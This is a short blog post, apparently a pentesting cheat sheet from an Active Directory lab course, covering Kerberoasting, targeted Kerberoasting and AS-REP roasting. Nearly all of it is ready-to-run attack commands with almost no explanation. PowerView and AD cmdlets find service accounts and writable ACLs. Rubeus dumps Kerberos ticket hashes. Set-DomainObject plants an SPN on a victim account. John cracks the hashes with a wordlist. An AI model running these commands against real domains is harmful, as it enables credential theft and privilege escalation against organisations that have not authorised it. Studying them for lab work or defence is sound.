---
layout: post
date: 30/10/2022
author: Aswin Gopalakrishnan
title: Kerberoast and Variants
---

## Kerberoasting

1. Find Service Accounts
```bash
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-DomainUser –SPN
```
2. Escalation via Service Accounts - Use Rubeus to request a TGS
```bash
Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```
3. Crack Ticket
```bash
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-
pass.txt C:\AD\Tools\hashes.txt
```

## Targeted Kerberoasting

1. Find "Write" Permissions
```bash
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
```
  
2. Find SPN
```bash
Get-DomainUser -Identity support1user | select serviceprincipalname
Get-ADUser -Identity support1user -Properties ServicePrincipalName | select ServicePrincipalName
```

3. Set-SPN
```bash
Set-DomainObject -Identity support1user -Set @{serviceprincipalname='us/myspnX'}
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='us/myspnX'}
    ```

4. Kerberoasting
```bash
Rubeus.exe kerberoast /outfile:targetedhashes.txt john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
```

## AS-REP Roasting

Find accounts without Kerberos preauthentication and request an AS-REP hash for offline cracking:
```bash
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
Invoke-ASREPRoast -Verbose
```


---

[back](../adprivesc.md)